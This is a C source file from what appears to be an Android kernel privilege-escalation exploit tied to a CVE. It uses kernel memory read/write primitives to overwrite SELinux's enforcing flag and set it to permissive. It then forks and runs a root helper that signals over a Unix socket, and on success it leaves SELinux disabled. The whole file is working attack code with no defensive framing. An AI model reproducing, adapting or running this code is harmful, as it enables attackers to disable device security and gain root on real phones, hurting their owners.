#include "common.h"

#include <stdlib.h>
#include <sys/un.h>
#include <unistd.h>
#include <sys/wait.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_write32_exact(int fd, uintptr_t target, uint32_t value) {
  uint32_t readback = 0;
  return root_write32(fd, target, value) &&
         root_read32(fd, target, &readback) && readback == value;
}

static int root_restore64(
    int fd, uintptr_t target, uint64_t ours, uint64_t old) {
  uint64_t current = 0;
  if (!root_read64(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write64_exact(fd, target, old);
}

static int root_restore32(
    int fd, uintptr_t target, uint32_t ours, uint32_t old) {
  uint32_t current = 0;
  if (!root_read32(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write32_exact(fd, target, old);
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

/*
 * Ghostwire path for kernels where call_usermodehelper_exec_work is STATIC.
 * Instead of workqueue forging, we disable SELinux and fork+exec the root
 * helper directly from the exploit process (which already has UID 0).
 */
static int install_forkexec_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  int selinux_changed = 0;
  int socket_ok = 0;
  int result = 0;

  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif

  if (strlen(root_umh_path) >= 256) {
    pr_error("root umh helper path too long\n");
    return 0;
  }

  /* Read current SELinux state */
  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root selinux addr=%016zx old=%u\n", selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  /* Disable SELinux enforcing */
  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
    pr_info("root selinux disabled\n");
  }

  /* Fork and exec root helper directly */
  char uid_str[16];
  snprintf(uid_str, sizeof(uid_str), "%u", getuid());

  pid_t pid = fork();
  if (pid < 0) {
    pr_error("root fork failed\n");
    goto cleanup;
  }

  if (pid == 0) {
    /* Child process: exec root helper */
    char *argv[] = {
      (char *)root_umh_path,
      (char *)"--umh",
      uid_str,
      NULL
    };
    char *envp[] = { NULL };
    execve(root_umh_path, argv, envp);
    _exit(127);
  }

  /* Parent: wait for socket */
  for (int i = 0; i < 300; i++) {
    if (root_socket_ready()) {
      socket_ok = 1;
      break;
    }
    /* Also reap child if it died early */
    int status;
    if (waitpid(pid, &status, WNOHANG) == pid) {
      pr_error("root helper exited early status=%d\n", WEXITSTATUS(status));
      break;
    }
    usleep(10000);
  }

  if (!socket_ok) {
    pr_error("root helper socket timeout\n");
  }

  result = socket_ok;

  /* If child is still running but socket never appeared, kill it */
  if (!socket_ok) {
    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
  }

cleanup:
  /* Restore SELinux if we changed it and root didn't fully succeed */
  if (selinux_changed && !result) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root selinux rollback failed\n");
    }
  } else if (result) {
    pr_info("root selinux left permissive old=%u\n", selinux_old);
  }

  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
  int result = install_forkexec_root(fd);
  pr_info("root result=%d uid_before=%u uid_after=%u done=%d\n",
          result, root_uid_before, root_uid_after, root_child_done);
  return result;
}
